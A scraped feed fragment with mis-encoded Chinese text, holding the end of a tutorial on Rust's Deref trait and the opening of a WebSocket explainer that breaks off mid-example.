<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li><code>deref()</code> å¿…é¡»è¿”å›å¼•ç”¨ï¼Œä¸èƒ½è¿”å›ä¸´æ—¶å€¼</li>
<li>å®ç° <code>DerefMut</code> å¿…é¡»å…ˆå®ç° <code>Deref</code></li>
<li>ä¸è¦ç”¨ <code>Deref</code> æ¨¡æ‹Ÿç»§æ‰¿ï¼Œåªç”¨äºæ™ºèƒ½æŒ‡é’ˆ</li>
</ul>
<h2 data-id="heading-17">5. ä½¿ç”¨åœºæ™¯</h2>

























<table><thead><tr><th>åœºæ™¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æ™ºèƒ½æŒ‡é’ˆ</td><td><code>Box</code>ã€<code>Rc</code>ã€<code>Arc</code> ç­‰éœ€è¦åƒæ™®é€šå¼•ç”¨ä¸€æ ·ä½¿ç”¨</td></tr><tr><td>åŒ…è£…ç±»å‹</td><td>ä¸ºç±»å‹æ·»åŠ é¢å¤–åŠŸèƒ½ï¼ˆå¦‚ç¼“å­˜ã€æ—¥å¿—ï¼‰ä½†ä¿æŒé€æ˜è®¿é—®</td></tr><tr><td>ç±»å‹è½¬æ¢</td><td><code>String</code> -&gt; <code>str</code>ã€<code>Vec&lt;T&gt;</code> -&gt; <code>[T]</code> ç­‰è‡ªåŠ¨è½¬æ¢</td></tr><tr><td>API è®¾è®¡</td><td>è®©å‡½æ•°æ¥å— <code>&amp;str</code> è€Œé <code>&amp;String</code>ï¼Œæ›´çµæ´»</td></tr></tbody></table>
<h3 data-id="heading-18">API è®¾è®¡æœ€ä½³å®è·µ</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// âŒ ä¸å¥½ï¼šå¼ºåˆ¶è°ƒç”¨è€…ä¼  String</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_bad</span>(s: &amp;<span class="hljs-type">String</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, s);
}

<span class="hljs-comment">// âœ… å¥½ï¼šæ¥å— &amp;strï¼ŒString å’Œ &amp;str éƒ½èƒ½ä¼ </span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_good</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, s);
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">owned</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">borrowed</span> = <span class="hljs-string">"world"</span>;
    
    <span class="hljs-comment">// process_bad(&amp;borrowed);  // é”™è¯¯ï¼&amp;str ä¸èƒ½è½¬ä¸º &amp;String</span>
    <span class="hljs-title function_ invoke__">process_bad</span>(&amp;owned);        <span class="hljs-comment">// åªèƒ½ä¼  String</span>
    
    <span class="hljs-title function_ invoke__">process_good</span>(&amp;owned);       <span class="hljs-comment">// &amp;String è‡ªåŠ¨è½¬ä¸º &amp;str</span>
    <span class="hljs-title function_ invoke__">process_good</span>(borrowed);     <span class="hljs-comment">// &amp;str ç›´æ¥ä¼ å…¥</span>
}
</code></pre>
<p><strong>åŸåˆ™</strong>ï¼šå‡½æ•°å‚æ•°ä¼˜å…ˆç”¨ <code>&amp;str</code>ã€<code>&amp;[T]</code> ç­‰åˆ‡ç‰‡ç±»å‹ï¼Œè€Œé <code>&amp;String</code>ã€<code>&amp;Vec&lt;T&gt;</code>ã€‚</p>
<h2 data-id="heading-19">6. å¸¸è§é™·é˜±</h2>
<h3 data-id="heading-20">é™·é˜± 1ï¼šè¿‡åº¦ä½¿ç”¨ Deref</h3>
<p><code>Deref</code> ä¸æ˜¯ç»§æ‰¿ï¼ä¸è¦ç”¨å®ƒæ¥æ¨¡æ‹Ÿé¢å‘å¯¹è±¡çš„ç»§æ‰¿å…³ç³»ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// âŒ é”™è¯¯ç¤ºä¾‹ï¼šç”¨ Deref æ¨¡æ‹Ÿç»§æ‰¿</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Employee</span> {
    name: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Manager</span> {
    employee: Employee,
    team_size: <span class="hljs-type">usize</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Manager</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = Employee;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;Employee {
        &amp;<span class="hljs-keyword">self</span>.employee
    }
}

<span class="hljs-comment">// è¿™ä¸æ˜¯ç»§æ‰¿ï¼Manager ä¸æ˜¯ Employee çš„å­ç±»</span>
</code></pre>
<p><strong>æ­£ç¡®åšæ³•</strong>ï¼šç”¨ç»„åˆï¼ˆcompositionï¼‰æˆ– traitã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span>;
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Employee</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        &amp;<span class="hljs-keyword">self</span>.name
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Manager</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        &amp;<span class="hljs-keyword">self</span>.employee.name
    }
}
</code></pre>
<h3 data-id="heading-21">é™·é˜± 2ï¼šDeref è¿”å›ä¸´æ—¶å€¼</h3>
<p><code>deref</code> å¿…é¡»è¿”å›å¼•ç”¨ï¼Œä¸èƒ½è¿”å›ä¸´æ—¶å€¼ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Wrapper</span>(<span class="hljs-type">i32</span>);

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Wrapper</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">i32</span>;
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">i32</span> {
        <span class="hljs-comment">// âŒ é”™è¯¯ï¼è¿”å›ä¸´æ—¶å€¼çš„å¼•ç”¨</span>
        <span class="hljs-comment">// &amp;(self.0 + 1)  // ä¸´æ—¶å€¼åœ¨å‡½æ•°ç»“æŸæ—¶é”€æ¯</span>
        
        <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šè¿”å›å­—æ®µçš„å¼•ç”¨</span>
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}
</code></pre>
<h3 data-id="heading-22">é™·é˜± 3ï¼šæ··æ·† Deref å’Œ AsRef</h3>




















<table><thead><tr><th>Trait</th><th>ç”¨é€”</th><th>è‡ªåŠ¨è½¬æ¢</th></tr></thead><tbody><tr><td><code>Deref</code></td><td>æ™ºèƒ½æŒ‡é’ˆè¡Œä¸º</td><td>æ˜¯ï¼ˆå‡½æ•°å‚æ•°ã€æ–¹æ³•è°ƒç”¨ï¼‰</td></tr><tr><td><code>AsRef</code></td><td>å»‰ä»·å¼•ç”¨è½¬æ¢</td><td>å¦ï¼ˆéœ€è¦æ˜¾å¼è°ƒç”¨ <code>.as_ref()</code>ï¼‰</td></tr></tbody></table>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">with_deref</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-comment">// &amp;String è‡ªåŠ¨è½¬æ¢</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">with_asref</span>&lt;T: <span class="hljs-built_in">AsRef</span>&lt;<span class="hljs-type">str</span>&gt;&gt;(s: T) {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s_ref</span>: &amp;<span class="hljs-type">str</span> = s.<span class="hljs-title function_ invoke__">as_ref</span>();  <span class="hljs-comment">// éœ€è¦æ˜¾å¼è°ƒç”¨</span>
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_ invoke__">with_deref</span>(&amp;s);      <span class="hljs-comment">// è‡ªåŠ¨è½¬æ¢</span>
<span class="hljs-title function_ invoke__">with_asref</span>(&amp;s);      <span class="hljs-comment">// æ³›å‹çº¦æŸï¼Œå†…éƒ¨éœ€è¦ as_ref()</span>
</code></pre>
<p><strong>é€‰æ‹©å»ºè®®</strong>ï¼š</p>
<ul>
<li>æ™ºèƒ½æŒ‡é’ˆç”¨ <code>Deref</code></li>
<li>æ³›å‹å‡½æ•°æ¥å—å¤šç§ç±»å‹ç”¨ <code>AsRef</code></li>
</ul>
<h3 data-id="heading-23">é™·é˜± 4ï¼šDerefMut çš„å€Ÿç”¨å†²çª</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Wrapper</span>(<span class="hljs-type">String</span>);

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Wrapper</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">String</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">String</span> {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">DerefMut</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Wrapper</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">String</span> {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">w</span> = <span class="hljs-title function_ invoke__">Wrapper</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-comment">// âŒ é”™è¯¯ï¼åŒæ—¶å­˜åœ¨å¯å˜å’Œä¸å¯å˜å¼•ç”¨</span>
    <span class="hljs-comment">// let r1 = &amp;w;</span>
    <span class="hljs-comment">// let r2 = &amp;mut w;</span>
    
    <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šåˆ†å¼€ä½¿ç”¨</span>
    {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = &amp;w;
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, r.<span class="hljs-title function_ invoke__">len</span>());
    }
    {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = &amp;<span class="hljs-keyword">mut</span> w;
        r.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);
    }
}
</code></pre>
<h2 data-id="heading-24">7. æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-25">1. åªä¸ºæ™ºèƒ½æŒ‡é’ˆå®ç° Deref</h3>
<p><code>Deref</code> çš„è®¾è®¡åˆè¡·æ˜¯è®©æ™ºèƒ½æŒ‡é’ˆè¡¨ç°å¾—åƒå¼•ç”¨ã€‚å¦‚æœä½ çš„ç±»å‹ä¸æ˜¯æ™ºèƒ½æŒ‡é’ˆï¼Œå¯èƒ½ä¸åº”è¯¥å®ç° <code>Deref</code>ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// âœ… åˆé€‚ï¼šæ™ºèƒ½æŒ‡é’ˆ</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);
<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; { <span class="hljs-comment">/* ... */</span> }

<span class="hljs-comment">// âŒ ä¸åˆé€‚ï¼šæ™®é€šç»“æ„ä½“</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> { name: <span class="hljs-type">String</span> }
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">User</span> {  <span class="hljs-comment">// ä¸è¦è¿™æ ·åšï¼</span>
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">String</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">String</span> { &amp;<span class="hljs-keyword">self</span>.name }
}
</code></pre>
<h3 data-id="heading-26">2. Target ç±»å‹åº”è¯¥æ˜¯ã€Œå†…éƒ¨æ•°æ®ã€</h3>
<p><code>Deref</code> åº”è¯¥æš´éœ²æ™ºèƒ½æŒ‡é’ˆå†…éƒ¨æŒæœ‰çš„æ•°æ®ï¼Œè€Œä¸æ˜¯è®¡ç®—å‡ºçš„æ–°å€¼ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// âœ… å¥½ï¼šæš´éœ²å†…éƒ¨æ•°æ®</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Box</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T { <span class="hljs-comment">/* è¿”å›å †ä¸Šçš„ T */</span> }
}

<span class="hljs-comment">// âŒ ä¸å¥½ï¼šè¿”å›è®¡ç®—å€¼</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">i32</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">i32</span> {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">sum</span>()  <span class="hljs-comment">// è¿™ä¸æ˜¯ Deref çš„ç”¨é€”ï¼</span>
    }
}
</code></pre>
<h3 data-id="heading-27">3. å‡½æ•°å‚æ•°ç”¨åˆ‡ç‰‡ç±»å‹</h3>
<p>åˆ©ç”¨ Deref coercionï¼Œè®© API æ›´çµæ´»ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// âœ… æ¨è</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(s: &amp;<span class="hljs-type">str</span>) { <span class="hljs-comment">/* ... */</span> }
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(slice: &amp;[<span class="hljs-type">i32</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> { <span class="hljs-comment">/* ... */</span> }

<span class="hljs-comment">// âŒ ä¸æ¨è</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(s: &amp;<span class="hljs-type">String</span>) { <span class="hljs-comment">/* ... */</span> }
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(vec: &amp;<span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<h3 data-id="heading-28">4. æ–‡æ¡£è¯´æ˜ Deref è¡Œä¸º</h3>
<p>å¦‚æœä½ çš„ç±»å‹å®ç°äº† <code>Deref</code>ï¼Œåœ¨æ–‡æ¡£ä¸­è¯´æ˜ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">/// æ™ºèƒ½æŒ‡é’ˆï¼ŒæŒæœ‰å †ä¸Šçš„ Tã€‚</span>
<span class="hljs-comment">/// </span>
<span class="hljs-comment">/// å®ç°äº† `Deref&lt;Target=T&gt;`ï¼Œå¯ä»¥åƒ `&amp;T` ä¸€æ ·ä½¿ç”¨ã€‚</span>
<span class="hljs-comment">/// </span>
<span class="hljs-comment">/// # ç¤ºä¾‹</span>
<span class="hljs-comment">/// </span>
<span class="hljs-comment">/// ```</span>
<span class="hljs-comment">/// let boxed = MyBox::new(5);</span>
<span class="hljs-comment">/// assert_eq!(5, *boxed);  // è§£å¼•ç”¨</span>
<span class="hljs-comment">/// ```</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);
</code></pre>
<h2 data-id="heading-29">æ€»ç»“</h2>
<ol>
<li><strong>Deref è®©ç±»å‹æ”¯æŒ <code>*</code> è§£å¼•ç”¨</strong>ï¼šè¿”å›å†…éƒ¨æ•°æ®çš„å¼•ç”¨</li>
<li><strong>è§£å¼•ç”¨å¼ºåˆ¶è½¬æ¢æ˜¯æ ¸å¿ƒç‰¹æ€§</strong>ï¼š<code>&amp;String</code> è‡ªåŠ¨è½¬ä¸º <code>&amp;str</code>ï¼Œè®© API æ›´çµæ´»</li>
<li><strong>åªä¸ºæ™ºèƒ½æŒ‡é’ˆå®ç° Deref</strong>ï¼šä¸è¦æ»¥ç”¨å®ƒæ¥æ¨¡æ‹Ÿç»§æ‰¿</li>
<li><strong>å‡½æ•°å‚æ•°ç”¨åˆ‡ç‰‡ç±»å‹</strong>ï¼š<code>&amp;str</code> è€Œé <code>&amp;String</code>ï¼Œ<code>&amp;[T]</code> è€Œé <code>&amp;Vec&lt;T&gt;</code></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WebSocketï¼šè®©HTTPçš„â€œå°¬èŠâ€å˜æˆçœŸæ­£çš„â€œç•…èŠâ€]]></title>    <link>https://juejin.cn/post/7596932640726794275</link>    <guid>https://juejin.cn/post/7596932640726794275</guid>    <pubDate>2026-01-20T01:08:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596932640726794275" data-draft-id="7596962344044609576" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WebSocketï¼šè®©HTTPçš„â€œå°¬èŠâ€å˜æˆçœŸæ­£çš„â€œç•…èŠâ€"/> <meta itemprop="keywords" content="åç«¯,Java,Spring Boot"/> <meta itemprop="datePublished" content="2026-01-20T01:08:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿç©ºç å­—"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WebSocketï¼šè®©HTTPçš„â€œå°¬èŠâ€å˜æˆçœŸæ­£çš„â€œç•…èŠâ€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿç©ºç å­—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:08:35.000Z" title="Tue Jan 20 2026 01:08:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æ‚Ÿã€‚</p>
<h2 data-id="heading-0">ä¸€ã€WebSocketæ˜¯ä»€ä¹ˆï¼Ÿâ€”â€” HTTPçš„â€œç¤¾æâ€è¡¨å¼Ÿå˜èº«â€œç¤¾äº¤ç‰›é€¼ç—‡â€</h2>
<p>æƒ³è±¡ä¸€ä¸‹HTTPåè®®æ˜¯ä¸ªæœ‰ç‚¹â€œç¤¾æâ€çš„ç¨‹åºå‘˜ï¼š</p>
<ul>
<li>æ¯æ¬¡èŠå¤©éƒ½è¦å…ˆè¯´â€œä½ å¥½â€ï¼Œå¯¹æ–¹å›â€œä½ å¥½â€ï¼Œç„¶åæ‰èƒ½è¯´æ­£äº‹</li>
<li>è¯´å®Œä¸€å¥è¯å°±å¿…é¡»é—­å˜´ï¼Œç­‰å¯¹æ–¹å›åº”æ‰èƒ½è¯´ä¸‹ä¸€å¥</li>
<li>æƒ³å®æ—¶èŠå¤©ï¼Ÿå¾—ä¸åœåœ°é—®â€œä½ æœ‰æ–°æ¶ˆæ¯å—ï¼Ÿâ€â€œç°åœ¨å‘¢ï¼Ÿâ€â€œç°åœ¨å‘¢ï¼Ÿâ€</li>
</ul>
<p>è€ŒWebSocketå°±åƒHTTPå–äº†åæ¯å’–å•¡çš„è¡¨å¼Ÿï¼š</p>
<ul>
<li>ä¸€æ¬¡æ¡æ‰‹ï¼Œç»ˆèº«è¿æ¥ï¼ˆç›´åˆ°ä½ ä¸»åŠ¨åˆ†æ‰‹ï¼‰</li>
<li>åŒå‘é€šè¯ï¼Œéšæ—¶æ’è¯</li>
<li>çœŸæ­£çš„â€œä½ ä¸€å¥æˆ‘ä¸€å¥â€ï¼Œä¸å†æ˜¯ä½ é—®ä¸€å¥æˆ‘ç­”ä¸€å¥çš„â€œå®¡è®¯å¼èŠå¤©â€</li>
</ul>

<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// HTTP vs WebSocket çš„æ—¥å¸¸å¯¹è¯å¯¹æ¯”</span>

<span class="hljs-comment">// HTTPçš„å°¬èŠåœºæ™¯ï¼š</span>
ä½ ï¼šå–‚ï¼Œåœ¨å—ï¼Ÿï¼ˆè¯·æ±‚ï¼‰
æœåŠ¡å™¨ï¼šåœ¨çš„ï¼ˆå“åº”ï¼‰
ä½ ï¼šåƒäº†å—ï¼Ÿï¼ˆè¯·æ±‚ï¼‰
æœåŠ¡å™¨ï¼šåƒäº†ï¼ˆå“åº”ï¼‰
